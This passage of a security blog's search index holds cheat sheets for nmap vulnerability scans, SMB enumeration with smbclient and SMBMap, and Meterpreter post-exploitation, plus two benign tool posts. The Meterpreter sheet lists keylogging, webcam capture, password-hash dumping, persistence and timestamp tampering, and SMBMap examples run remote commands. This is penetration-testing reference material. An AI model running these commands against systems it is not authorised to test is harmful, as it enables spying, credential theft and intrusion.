\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, ****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective (sometimes), that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Meterpreter, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\nBasic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. Final Thoughts Meterpreter is your trusty post-exploitation buddy. Use it wisely, creatively, and responsibly. Keep this cheat sheet handy for quick reference—whether you\u0026rsquo;re downloading files, snapping screenshots, or simply making your mark in the digital shadows. Happy hacking!\n","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003cp\u003e\u003cstrong\u003eMeterpreter\u003c/strong\u003e, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\u003c/p\u003e\n\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget \u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. Final Thoughts smbclient is a powerful yet straightforward tool for interacting with SMB shares. Whether you’re performing quick tests or conducting audits, it streamlines tasks that would otherwise require mounting shares. Keep this cheat sheet handy for quick reference and efficient file share management!\n","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"SMBMap is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\nBasic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. Final Thoughts SMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\n","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003cp\u003e\u003cstrong\u003eSMBMap\u003c/strong\u003e is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" 